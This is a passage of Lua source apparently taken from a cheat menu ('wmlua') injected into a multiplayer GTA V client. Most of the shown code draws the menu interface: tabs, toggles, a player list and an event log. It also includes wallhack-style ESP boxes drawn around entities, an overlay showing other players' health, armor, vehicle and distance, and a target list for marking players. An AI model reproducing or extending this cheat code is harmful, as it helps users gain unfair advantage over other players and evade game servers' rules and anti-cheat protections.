            wmlua.N.SetTexEdge(2, 0, 0, 0, 150)
            wmlua.H.WMInvokeNative(0x465C84BC39F1C351)
            wmlua.H.WMInvokeNative(0x2513DFB0FB8400FE)
            wmlua.H.WMInvokeNative(0x25FBB336DF1804CB, wmlua.STRINGS[24])
            wmlua.H.WMInvokeNative(0xC02F4DBFB51D988B, 1)
            wmlua.H.WMInvokeNative(0xBE6B23FFA53FB442, rgba[1], rgba[2], rgba[3], rgba[4])
            wmlua.N.AddTextComponentSubstringPlayerName(text)
            wmlua.N.SetDrawOrigin(x,y,z,0)
            wmlua.H.WMInvokeNative(0xCD015E5BB0D96A57, _x,_y)
            wmlua.N.ClearDrawOrigin()

        end

    end

    function wmlua.F.Draw2dText(text, x, y, scale, size, r, g, b, a, font)

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then

            wmlua.H.WMInvokeNative(0x25FBB336DF1804CB, wmlua.STRINGS[24])
            if font then
                wmlua.N.SetTextFont(font)
            else
                wmlua.N.SetTextFont(4)
            end
            wmlua.N.SetTextScale(scale, size)
            wmlua.N.SetTextDropShadow(1, 0, 0, 0, 255)
            wmlua.H.WMInvokeNative(0x465C84BC39F1C351)
            wmlua.H.WMInvokeNative(0x2513DFB0FB8400FE)
            wmlua.H.WMInvokeNative(wmlua.STRINGS[23], 1)
            wmlua.H.WMInvokeNative(0xBE6B23FFA53FB442, r,g,b,a)
            wmlua.N.AddTextComponentSubstringPlayerName(text)
            wmlua.H.WMInvokeNative(0xCD015E5BB0D96A57, x, y)

        end

    end

    function wmlua.F.DrawRect(x,y,width,height,r,g,b,a,origin)
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
            wmlua.H.WMInvokeNative(0x3A618A217E5154F0, x + width/2, y + height/2, width, height, r, g, b, a)
        end
    end
    
    function wmlua.F.DrawRect2(x,y,width,height,r,g,b,a)
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
            wmlua.H.WMInvokeNative(0x3A618A217E5154F0, x, y, width, height, r, g, b, a)
        end
    end

    function wmlua.F.BoxEntity2D(ent, etype)
        if wmlua.N.IsEntityOnScreen(ent) then
            local model = wmlua.N.GetEntityModel(ent)
            local min, max = wmlua.N.GetModelDimensions(model)
            local topBox = wmlua.N.GetOffsetFromEntityInWorldCoords(ent, 0, 0, max.z - 0.2)
            local bottomBox = wmlua.N.GetOffsetFromEntityInWorldCoords(ent, 0, 0, min.z)
            local _, topBoxX, topBoxY = wmlua.N.World3dToScreen(topBox.x, topBox.y, topBox.z)
            local _2, bottomBoxX, bottomBoxY = wmlua.N.World3dToScreen(bottomBox.x, bottomBox.y, bottomBox.z)
            if _ and _2 then
                local height = bottomBoxY - topBoxY
                local width = (height/4)
                local widthh = width / 28
                local heighth = widthh * 0.996
                if widthh < 0.0005 then
                    widthh = 0.0005
                elseif widthh > 0.001 then
                    widthh = 0.001
                end
                if heighth < 0.001 then
                    heighth = 0.001
                elseif heighth > 0.002 then
                    heighth = 0.002
                end
                local sideOffset = width / 2
                local heightOffset = height / 2
                local color = {0,0,0,75}
                local innercolor = {}
                if etype == 1 then
                    innercolor = {0, 255, 0, 255}
                elseif etype == 2 then
                    innercolor = {170,170,170,255}
                elseif etype == 3 then
                    innercolor = {255,100,100,255}
                elseif etype == 4 then
                    innercolor = {255,255,255,255}
                end
                wmlua.N.SetDrawOrigin(wmlua.N.GetOffsetFromEntityInWorldCoords(ent, 0.0,0.0,-0.1))
                wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0, w = width, h = height}, {red = color[1], green = color[2], blue = color[3], alpha = color[4]})
                wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 - sideOffset + (widthh / 1.5), yo = 0.0, w = widthh, h = height * 0.996}, {red = innercolor[1], green = innercolor[2], blue = innercolor[3], alpha = innercolor[4]}) -- left
                wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0 + sideOffset - (widthh / 1.5), yo = 0.0, w = widthh, h = height * 0.996}, {red = innercolor[1], green = innercolor[2], blue = innercolor[3], alpha = innercolor[4]}) -- right
                wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 + heightOffset - (widthh / 1.5), w = (width * 0.99), h = heighth}, {red = innercolor[1], green = innercolor[2], blue = innercolor[3], alpha = innercolor[4]}) -- top
                wmlua.menu.f.drawrect_pure({manualorigin = true, xo = 0.0, yo = 0.0 - heightOffset + (widthh / 1.5), w = (width * 0.99), h = heighth}, {red = innercolor[1], green = innercolor[2], blue = innercolor[3], alpha = innercolor[4]}) -- bottom
                wmlua.N.ClearDrawOrigin()
            end
        end
    end

    function wmlua.menu.f.drawrect_pure(xywh,rgba)
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
            if xywh.origin ~= nil or xywh.xo then
                if not xywh.manualorigin then wmlua.N.SetDrawOrigin(xywh.origin) end
                if xywh.xo ~= nil then
                    return wmlua.H.WMInvokeNative(0x3A618A217E5154F0, xywh.xo, xywh.yo, xywh.w, xywh.h, rgba.red, rgba.green, rgba.blue, rgba.alpha)
                else
                    return wmlua.H.WMInvokeNative(0x3A618A217E5154F0, 0.0, 0.0, xywh.w, xywh.h, rgba.red, rgba.green, rgba.blue, rgba.alpha)
                end
            else
                return wmlua.H.WMInvokeNative(0x3A618A217E5154F0, xywh.x, xywh.y, xywh.w, xywh.h, rgba.red, rgba.green, rgba.blue, rgba.alpha)
            end
            if xywh.origin ~= nil then
                if not xywh.manualorigin then wmlua.N.ClearDrawOrigin() end
            end
        end
    end

    function wmlua.menu.f.drawrect(xywh,rgba)
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
            wmlua.H.WMInvokeNative(0x3A618A217E5154F0, xywh.x + xywh.w/2, xywh.y + xywh.h/2, xywh.w, xywh.h, rgba.red, rgba.green, rgba.blue, rgba.alpha)
        end
    end

    function wmlua.menu.f.drawtext(data, color)
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
            wmlua.H.WMInvokeNative(0x25FBB336DF1804CB, "STRING")
            if data.font then
                wmlua.N.SetTextFont(data.font)
            else
                wmlua.N.SetTextFont(4)
            end
            wmlua.N.SetTextScale(data.scale, data.size)
            wmlua.N.SetTextDropShadow(1, 0, 0, 0, 255)
            wmlua.H.WMInvokeNative(0x465C84BC39F1C351)
            wmlua.H.WMInvokeNative(0x2513DFB0FB8400FE)
            wmlua.H.WMInvokeNative(wmlua.STRINGS[23], 1)
            wmlua.H.WMInvokeNative(0xBE6B23FFA53FB442, color.red, color.green, color.blue, color.alpha)
            wmlua.N.AddTextComponentSubstringPlayerName(data.text)
            wmlua.H.WMInvokeNative(0xCD015E5BB0D96A57, data.x, data.y)
        end
    end

    wmlua.V.PlistHoveredName = 0

    wmlua.V.TabSetup = false

    function wmlua.F.DrawEventLog()

        wmlua.V.DEvents = 0
        wmlua.V.EYoffset_txt = 0
        wmlua.V.EYoffset_bg = -0.020
        for i = 1, #wmlua.I.EventLog do
            if wmlua.I.EventLog[i].duration ~= nil and wmlua.I.EventLog[i].initTime ~= nil then
                if wmlua.N.Get_GameTimer() - wmlua.I.EventLog[i].duration < wmlua.I.EventLog[i].initTime and wmlua.V.DEvents < 18 then
                    wmlua.V.DEvents = wmlua.V.DEvents + 1
                    wmlua.F.Draw2dText(wmlua.I.EventLog[i].lbl, 0.012, 0.428 + wmlua.V.EYoffset_txt, 0.08, 0.3, 255, 255, 255, 255)
                    wmlua.V.EYoffset_txt = wmlua.V.EYoffset_txt + 0.020
                    wmlua.V.EYoffset_bg = wmlua.V.EYoffset_bg + 0.020
                end
            else
                wmlua.I.EventLog[i] = nil
            end
        end

        if wmlua.V.DEvents > 0 then
            wmlua.F.DrawRect(0.010, 0.400, 0.22, 0.026, 10,10,10,185) -- Header : Event Log
            wmlua.F.DrawRect(0.010, 0.427, 0.22, 0.026 + wmlua.V.EYoffset_bg, 10,10,10,185) -- Body : Event Log
            wmlua.F.Draw2dText(wmlua.STRINGS[95], 0.012, 0.402, 0.08, 0.3, 255, 255, 255, 255)
        end

    end

    function wmlua.F.DrawExtendedInfo(ply)

        wmlua.V.EI_Offset = 0
        wmlua.V.EI_PlayerEnt = wmlua.N.GetPlayerPed(ply)

        if wmlua.N.IsPedInAVehicle(wmlua.V.EI_PlayerEnt) then
            wmlua.V.Veh = wmlua.N.GetVehicleName(wmlua.N.GetEntityModel(wmlua.N.GetVehiclePedIsIn(wmlua.V.EI_PlayerEnt))) .. " (" .. wmlua.N.GetLabelText("VEH_CLASS_" .. wmlua.N.GetVehicleClass(wmlua.N.GetVehiclePedIsIn(wmlua.V.EI_PlayerEnt, false))) .. ")"
        else
            wmlua.V.Veh = "None"
        end

        if tonumber(wmlua.N.GetEntityHealth(wmlua.V.EI_PlayerEnt)) < 100 then
            wmlua.V.State = "~r~DEAD~w~"
        elseif wmlua.N.IsPedStill(wmlua.V.EI_PlayerEnt) then
            wmlua.V.State = "Idle"
        elseif wmlua.N.IsPedWalking(wmlua.V.EI_PlayerEnt) then
            wmlua.V.State = "Walking"
        elseif wmlua.N.IsPedBeingStunned(wmlua.V.EI_PlayerEnt) then
            wmlua.V.State = "Stunned"
        elseif wmlua.N.IsPedStrafing(wmlua.V.EI_PlayerEnt) then
            wmlua.V.State = "Strafing"
        elseif wmlua.N.IsPedSprinting(wmlua.V.EI_PlayerEnt) then
            wmlua.V.State = "Running"
        elseif wmlua.N.IsPedSwimming(wmlua.V.EI_PlayerEnt) then
            wmlua.V.State = "Swimming"
        else
            wmlua.V.State = "Undefined"
        end

        wmlua.V.EI_PDist = wmlua.N.CompareDistance(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()), wmlua.N.GetEntityPos(wmlua.V.EI_PlayerEnt))

        wmlua.T.EI_PlayerInfo = {}

        wmlua.F.InsertToTable(wmlua.T.EI_PlayerInfo, "Health: " .. wmlua.N.GetEntityHealth(wmlua.V.EI_PlayerEnt))
        wmlua.F.InsertToTable(wmlua.T.EI_PlayerInfo, "Armor: " .. wmlua.N.GetPedArmor(wmlua.V.EI_PlayerEnt))
        wmlua.F.InsertToTable(wmlua.T.EI_PlayerInfo, "State: " .. wmlua.V.State)
        wmlua.F.InsertToTable(wmlua.T.EI_PlayerInfo, "Veh: " .. wmlua.V.Veh)
        wmlua.F.InsertToTable(wmlua.T.EI_PlayerInfo, "Dist: " .. wmlua.F.Round(wmlua.V.EI_PDist, 0) .. "m")

        wmlua.menu.f.drawtext({text = "[~b~WM~w~] Extended Info (" .. wmlua.N.GetPlayerServerId(ply) .. ", " .. string.sub(wmlua.N.GetPlayerName(ply), 1,15) .. ")", x = wmlua.menu.v.playerlist_extended_x_origin + 0.004, y = wmlua.menu.v.top_y_origin + 0.040 + wmlua.V.EI_Offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})

        for i = 1, #wmlua.T.EI_PlayerInfo do
            wmlua.menu.f.drawtext({text = wmlua.T.EI_PlayerInfo[i], x = wmlua.menu.v.playerlist_extended_x_origin + 0.004, y = wmlua.menu.v.top_y_origin + 0.057 + wmlua.V.EI_Offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
            wmlua.V.EI_Offset = wmlua.V.EI_Offset + 0.018
        end

        wmlua.menu.f.drawrect({x = wmlua.menu.v.playerlist_extended_x_origin, y = wmlua.menu.v.playerlist_extended_y_origin, w = 0.120, h = 0.032 + wmlua.V.EI_Offset}, {red = wmlua.V.theme_menu_bg_r, green = wmlua.V.theme_menu_bg_g, blue = wmlua.V.theme_menu_bg_b, alpha = wmlua.V.theme_menu_bg_a})
        
    end

    function wmlua.menu.f.drawtabs()

        wmlua.menu.v.tabs_text_x_offset = wmlua.menu.v.x_origin + 0.006
        wmlua.menu.v.tabs_text_y_offset = wmlua.menu.v.y_origin + 0.008

        wmlua.menu.v.tabs_rect_x_offset = wmlua.menu.v.tabs_text_x_offset - 0.002
        wmlua.menu.v.tabs_rect_y_offset = wmlua.menu.v.tabs_text_y_offset + 0.005

        for i = wmlua.menu.v.tabs_scroll_cur, wmlua.menu.v.tabs_scroll_cur + wmlua.menu.v.tabs_scroll_max do
            if wmlua.T.MenuTabs[i] then
                if i == wmlua.V.MenuHoveredTab then
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuTabs[i].label, x = wmlua.menu.v.tabs_text_x_offset, y = wmlua.menu.v.tabs_text_y_offset, scale = 0.1, size = 0.28}, {red = 255, green = 50, blue = 50, alpha = 255})
                elseif i == wmlua.V.MenuSelectedTab then
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuTabs[i].label, x = wmlua.menu.v.tabs_text_x_offset, y = wmlua.menu.v.tabs_text_y_offset, scale = 0.1, size = 0.28}, {red = 0, green = 165, blue = 200, alpha = 255})
                    wmlua.menu.f.drawrect({x = wmlua.menu.v.tabs_rect_x_offset, y = wmlua.menu.v.tabs_rect_y_offset - 0.004, w = 0.042, h = 0.018}, {red = wmlua.V.theme_menu_bg_r, green = wmlua.V.theme_menu_bg_g, blue = wmlua.V.theme_menu_bg_b, alpha = wmlua.V.theme_menu_bg_a})
                else
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuTabs[i].label, x = wmlua.menu.v.tabs_text_x_offset, y = wmlua.menu.v.tabs_text_y_offset, scale = 0.1, size = 0.28}, {red = 255, green = 255, blue = 255, alpha = 255})
                end
                wmlua.menu.v.tabs_text_y_offset = wmlua.menu.v.tabs_text_y_offset + 0.022
                wmlua.menu.v.tabs_rect_y_offset = wmlua.menu.v.tabs_rect_y_offset + 0.022
            end
        end

    end

    wmlua.N.RequestStreamedTextureDict('commonmenu', false)

    function wmlua.menu.f.drawbuttons()

        wmlua.menu.v.buttons_text_x_offset = wmlua.menu.v.x_origin + 0.060
        wmlua.menu.v.buttons_text_y_offset = wmlua.menu.v.y_origin + 0.008

        wmlua.menu.v.buttons_rect_x_offset = wmlua.menu.v.buttons_text_x_offset + 0.002
        wmlua.menu.v.buttons_rect_y_offset = wmlua.menu.v.buttons_text_y_offset + 0.005

        for i = wmlua.menu.v.buttons_scroll_cur, wmlua.menu.v.buttons_scroll_cur + wmlua.menu.v.buttons_scroll_max do

            if wmlua.T.MenuButtons[i] and wmlua.T.MenuButtons[i].ctrlType == "button" then

                if i == wmlua.V.MenuHoveredButton then
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuButtons[i].label, x = wmlua.menu.v.buttons_text_x_offset, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 50, blue = 50, alpha = 255})
                elseif i == wmlua.V.MenuSelectedButton then
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuButtons[i].label, x = wmlua.menu.v.buttons_text_x_offset, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 0, green = 165, blue = 200, alpha = 255})
                else
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuButtons[i].label, x = wmlua.menu.v.buttons_text_x_offset, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                end

            end

            if wmlua.T.MenuButtons[i] and wmlua.T.MenuButtons[i].ctrlType == "toggle" then

                wmlua.menu.f.drawrect({x = wmlua.menu.v.buttons_text_x_offset + 0.0019, y = wmlua.menu.v.buttons_text_y_offset + 0.0045, w = 0.008, h = 0.012}, {red = wmlua.V.theme_menu_bg_r + 20, green = wmlua.V.theme_menu_bg_g + 20, blue = wmlua.V.theme_menu_bg_b + 20, alpha = 255})
                
                if i == wmlua.V.MenuHoveredButton then
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuButtons[i].label, x = wmlua.menu.v.buttons_text_x_offset + 0.015, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 50, blue = 50, alpha = 255})
                    wmlua.N.DrawSprite('commonmenu', 'shop_tick_icon', wmlua.menu.v.buttons_text_x_offset + 0.006, wmlua.menu.v.buttons_text_y_offset + 0.011, 0.014, 0.018, 0.0, 255, 50, 50, 255)
                elseif wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].active == true then
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuButtons[i].label, x = wmlua.menu.v.buttons_text_x_offset + 0.015, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                    wmlua.N.DrawSprite('commonmenu', 'shop_tick_icon', wmlua.menu.v.buttons_text_x_offset + 0.006, wmlua.menu.v.buttons_text_y_offset + 0.011, 0.014, 0.018, 0.0, 50, 205, 50, 255)
                else
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuButtons[i].label, x = wmlua.menu.v.buttons_text_x_offset + 0.015, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                end

            end

            if wmlua.T.MenuButtons[i] and wmlua.T.MenuButtons[i].ctrlType == "selector" then

                wmlua.N.DrawSprite('commonmenu', 'arrowleft', wmlua.menu.v.buttons_text_x_offset + 0.0055 , wmlua.menu.v.buttons_text_y_offset + 0.011, 0.014, 0.018, 0.0, 255, 255, 255, 255)
                wmlua.N.DrawSprite('commonmenu', 'arrowright', wmlua.menu.v.buttons_text_x_offset + 0.0305 , wmlua.menu.v.buttons_text_y_offset + 0.011, 0.014, 0.018, 0.0, 255, 255, 255, 255)
                wmlua.menu.f.drawtext({text = 'apply', x = wmlua.menu.v.buttons_text_x_offset + 0.011, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                --wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].optlist[wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval]
                if i == wmlua.V.MenuHoveredButton then
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuButtons[i].label .. " " .. wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].optlist[wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval], x = wmlua.menu.v.buttons_text_x_offset + 0.035, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 50, blue = 50, alpha = 255})
                else
                    wmlua.menu.f.drawtext({text = wmlua.T.MenuButtons[i].label .. " " .. wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].optlist[wmlua.T.Cheese[wmlua.T.FI[wmlua.T.MenuButtons[i].name]].tempval], x = wmlua.menu.v.buttons_text_x_offset + 0.035, y = wmlua.menu.v.buttons_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                end

            end

            wmlua.menu.v.buttons_text_y_offset = wmlua.menu.v.buttons_text_y_offset + 0.022
            wmlua.menu.v.buttons_rect_y_offset = wmlua.menu.v.buttons_rect_y_offset + 0.022

        end

    end

    function wmlua.menu.f.drawplayerlist()

        wmlua.menu.v.playerlist_text_x_offset = wmlua.menu.v.x_origin + 0.206
        wmlua.menu.v.playerlist_text_y_offset = wmlua.menu.v.y_origin + 0.008

        wmlua.menu.v.playerlist_rect_x_offset = wmlua.menu.v.playerlist_text_x_offset + 0.002
        wmlua.menu.v.playerlist_rect_y_offset = wmlua.menu.v.playerlist_text_y_offset + 0.005

        if #wmlua.Playerlist_Players < wmlua.menu.v.tabs_scroll_cur then
            wmlua.menu.v.playerlist_scroll_cur = wmlua.F.ClampInt(wmlua.V.MenuSelectedButton - wmlua.menu.v.playerlist_scroll_max, 1, #wmlua.Playerlist_Players, true)
        elseif wmlua.menu.v.playerlist_scroll_cur < 1 then
            wmlua.menu.v.playerlist_scroll_cur = 1
        end

        for i = wmlua.menu.v.playerlist_scroll_cur, wmlua.menu.v.playerlist_scroll_cur + wmlua.menu.v.playerlist_scroll_max do

            if wmlua.Playerlist_Players[i] then

                if wmlua.menu.v.hoveredplayer == i or wmlua.T.TableContains(wmlua.T.TargetList, wmlua.Playerlist_Players[i].pid) then
                    wmlua.menu.f.drawtext({text = "ID: " .. wmlua.Playerlist_Players[i].pid .. " | NAME: " .. string.sub(wmlua.F.CleanString(wmlua.Playerlist_Players[i].name, "color"), 1,15) .. "~s~ | M/F: " .. wmlua.Playerlist_Players[i].sex, x = wmlua.menu.v.playerlist_text_x_offset, y = wmlua.menu.v.playerlist_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 50, blue = 50, alpha = 255})
                elseif wmlua.Playerlist_Players[i].pid == wmlua.N.GetPlayerServerId(wmlua.N.PlayerId()) or wmlua.T.TableContains(wmlua.T.FriendList, wmlua.Playerlist_Players[i].pid) then
                    wmlua.menu.f.drawtext({text = "ID: " .. wmlua.Playerlist_Players[i].pid .. " | NAME: " .. string.sub(wmlua.F.CleanString(wmlua.Playerlist_Players[i].name, "color"), 1,15) .. "~s~ | M/F: " .. wmlua.Playerlist_Players[i].sex, x = wmlua.menu.v.playerlist_text_x_offset, y = wmlua.menu.v.playerlist_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 110, green = 255, blue = 110, alpha = 255})
                else
                    wmlua.menu.f.drawtext({text = "ID: " .. wmlua.Playerlist_Players[i].pid .. " | NAME: " .. string.sub(wmlua.F.CleanString(wmlua.Playerlist_Players[i].name, "color"), 1,15) .. "~s~ | M/F: " .. wmlua.Playerlist_Players[i].sex, x = wmlua.menu.v.playerlist_text_x_offset, y = wmlua.menu.v.playerlist_text_y_offset, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                end

                wmlua.menu.v.playerlist_text_y_offset = wmlua.menu.v.playerlist_text_y_offset + 0.022

            end

        end

    end

    function wmlua.menu.f.handleinfo(info, openMenu) -- shit maffs cuz im lazy huehue

        if not wmlua.menu.v.displayinfo then
            wmlua_Thread(function()
                wmlua.menu.v.displayinfo = true
                if type(info) == "string" then
                    info = wmlua.F.Split(info, '\n')
                end
                wmlua.menu.v.info_scroll_cur = 1
                wmlua.menu.v.info_scroll_max = 28
                repeat
                    
                    wmlua.menu.v.mx, wmlua.menu.v.my = wmlua.N.GetCursorPos()
                    wmlua.menu.v.sx, wmlua.menu.v.sy = wmlua.N.GetResolution()
                    wmlua.menu.v.xp = wmlua.F.PA(wmlua.menu.v.mx, wmlua.menu.v.sx)
                    wmlua.menu.v.yp = wmlua.F.PA(wmlua.menu.v.my, wmlua.menu.v.sy)
                    if not wmlua.N.IsPauseMenuActive() then
                        wmlua.N.DisplayCursor()
                        wmlua.N.SetCursor(0)
                    end
                    
                    for i = 30, 36 do
                        wmlua.H.WMInvokeNative(0x351220255D64C155, 0, i, true)
                    end
                    for i = 21, 26 do
                        wmlua.H.WMInvokeNative(0x351220255D64C155, 0, i, true)
                    end
                    for i = 59, 139 do
                        wmlua.H.WMInvokeNative(0x351220255D64C155, 0, i, true)
                    end
                    
                    wmlua.menu.v.main_x_origin = 0.25
                    wmlua.menu.v.main_y_origin = 0.265
                    -- .. wmlua.menu.v.xp .. " | " .. wmlua.menu.v.yp
                    wmlua.menu.f.drawrect({x = wmlua.menu.v.main_x_origin, y = wmlua.menu.v.main_y_origin, w = 0.500, h = 0.590}, {red = wmlua.V.theme_menu_bg_r, green = wmlua.V.theme_menu_bg_g, blue = wmlua.V.theme_menu_bg_b, alpha = wmlua.V.theme_menu_bg_a})
                    wmlua.menu.f.drawtext({text = identity.long .. ".net | Info Viewer ", x = wmlua.menu.v.main_x_origin + 0.003, y = wmlua.menu.v.main_y_origin + 0.003, scale = 0.1, size = 0.30, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                    
                    wmlua.menu.v.info_offsety = 0
                    
                    for i = wmlua.menu.v.info_scroll_cur, wmlua.menu.v.info_scroll_max do
                        if info[i] ~= nil then
                            wmlua.menu.f.drawtext({text = tostring(info[i]), x = wmlua.menu.v.main_x_origin + 0.003, y = wmlua.menu.v.main_y_origin + 0.020 + wmlua.menu.v.info_offsety, scale = 0.1, size = 0.34, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                            wmlua.menu.v.info_offsety = wmlua.menu.v.info_offsety + 0.020
                        end
                    end
                    
                    if wmlua.F.PressedCTRL(0, 14) and wmlua.menu.v.xp > 24.7 and wmlua.menu.v.xp < 74.58 and wmlua.menu.v.yp > 26.3 and wmlua.menu.v.yp < 85.8 then
                        if wmlua.menu.v.info_scroll_cur + 1 <= #info then
                            wmlua.menu.v.info_scroll_cur = wmlua.menu.v.info_scroll_cur + 1
                            wmlua.menu.v.info_scroll_max = wmlua.menu.v.info_scroll_max + 1
                        end
                    elseif wmlua.F.PressedCTRL(0, 15) and wmlua.menu.v.xp > 24.7 and wmlua.menu.v.xp < 74.58 and wmlua.menu.v.yp > 26.3 and wmlua.menu.v.yp < 85.8 then
                        if wmlua.menu.v.info_scroll_cur - 1 > 0 then
                            wmlua.menu.v.info_scroll_cur = wmlua.menu.v.info_scroll_cur - 1
                            wmlua.menu.v.info_scroll_max = wmlua.menu.v.info_scroll_max - 1
                        end
                    end
        
                    if wmlua.F.PressedCTRL(0, 177) then
                        wmlua.menu.v.displayinfo = false
                        if openMenu then
                            wmlua.menu.v.drawmenu = true
                        end
                    end
                    
                    wmlua_Schleep(0)
                    
                until not wmlua.menu.v.displayinfo
            end)
        end
    
    end

    function wmlua.menu.f.mousehandler()

        wmlua.V.MenuHoveredTab = 0
        wmlua.V.MenuHoveredButton = 0
        wmlua.menu.v.hoveredplayer = 0

        wmlua.V.mx, wmlua.V.my = wmlua.N.GetCursorPos()
        wmlua.V.sx, wmlua.V.sy = wmlua.N.GetResolution()
        wmlua.V.xp = wmlua.F.PA(wmlua.V.mx, wmlua.V.sx)
        wmlua.V.yp = wmlua.F.PA(wmlua.V.my, wmlua.V.sy)

        --wmlua.menu.f.drawtext({text = wmlua.V.xp .. " | " .. wmlua.V.yp, x = 0.5, y = 0.1, scale = 0.1, size = 0.28, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})

        wmlua.menu.v.tabs_rect_x_offset_mx = wmlua.menu.v.x_origin + 0.006
        wmlua.menu.v.tabs_rect_y_offset_my = wmlua.menu.v.y_origin + 0.008

        wmlua.menu.v.buttons_rect_x_offset_mx = wmlua.menu.v.x_origin + 0.056
        wmlua.menu.v.buttons_rect_y_offset_my = wmlua.menu.v.y_origin + 0.008

        wmlua.menu.v.playerlist_rect_x_offset_mx = wmlua.menu.v.x_origin + 0.204
        wmlua.menu.v.playerlist_rect_y_offset_my = wmlua.menu.v.y_origin + 0.008

        wmlua.menu.v.tabs_mx_start = ( wmlua.menu.v.tabs_rect_x_offset_mx - 0.0028 ) * 100
        wmlua.menu.v.tabs_mx_end = ( wmlua.menu.v.tabs_rect_x_offset_mx + 0.0383 ) * 100

        wmlua.menu.v.tabs_my_start = ( wmlua.menu.v.tabs_rect_y_offset_my - 0.0 ) * 100
        wmlua.menu.v.tabs_my_end = ( wmlua.menu.v.tabs_rect_y_offset_my + 0.018 ) * 100

        wmlua.menu.v.buttons_mx_start = ( wmlua.menu.v.buttons_rect_x_offset_mx - 0.0028 ) * 100
        wmlua.menu.v.buttons_mx_end = ( wmlua.menu.v.buttons_rect_x_offset_mx + 0.122 ) * 100

        wmlua.menu.v.buttons_my_start = ( wmlua.menu.v.buttons_rect_y_offset_my - 0.0 ) * 100
        wmlua.menu.v.buttons_my_end = ( wmlua.menu.v.buttons_rect_y_offset_my + 0.018 ) * 100

        wmlua.menu.v.playerlist_mx_start = ( wmlua.menu.v.playerlist_rect_x_offset_mx - 0.0028 ) * 100
        wmlua.menu.v.playerlist_mx_end = ( wmlua.menu.v.playerlist_rect_x_offset_mx + 0.122 ) * 100

        wmlua.menu.v.playerlist_my_start = ( wmlua.menu.v.playerlist_rect_y_offset_my - 0.0 ) * 100
        wmlua.menu.v.playerlist_my_end = ( wmlua.menu.v.playerlist_rect_y_offset_my + 0.018 ) * 100

        wmlua.menu.v.top_mx_start = ( wmlua.menu.v.x_origin + 0.051 ) * 100
        wmlua.menu.v.top_mx_end = ( wmlua.menu.v.x_origin + 0.192 ) * 100

        wmlua.menu.v.top_my_start = ( wmlua.menu.v.y_origin - 0.051 ) * 100
        wmlua.menu.v.top_my_end = ( wmlua.menu.v.y_origin - 0.005 ) * 100

        wmlua.menu.v.buttons_mx_start_scroll = ( wmlua.menu.v.buttons_rect_x_offset_mx - 0.0028 ) * 100
        wmlua.menu.v.buttons_mx_end_scroll = ( wmlua.menu.v.buttons_rect_x_offset_mx + 0.134 ) * 100

        wmlua.menu.v.buttons_my_start_scroll = ( wmlua.menu.v.buttons_rect_y_offset_my - 0.01 ) * 100
        wmlua.menu.v.buttons_my_end_scroll = ( wmlua.menu.v.buttons_rect_y_offset_my + 0.390 ) * 100

        wmlua.menu.v.tabs_mx_start_scroll = ( wmlua.menu.v.tabs_rect_x_offset_mx - 0.010 ) * 100
        wmlua.menu.v.tabs_mx_end_scroll = ( wmlua.menu.v.tabs_rect_x_offset_mx + 0.040 ) * 100

        wmlua.menu.v.tabs_my_start_scroll = ( wmlua.menu.v.tabs_rect_y_offset_my - 0.01 ) * 100
        wmlua.menu.v.tabs_my_end_scroll = ( wmlua.menu.v.tabs_rect_y_offset_my + 0.390 ) * 100

        wmlua.menu.v.playerlist_mx_start_scroll = ( wmlua.menu.v.playerlist_rect_x_offset_mx - 0.0075 ) * 100
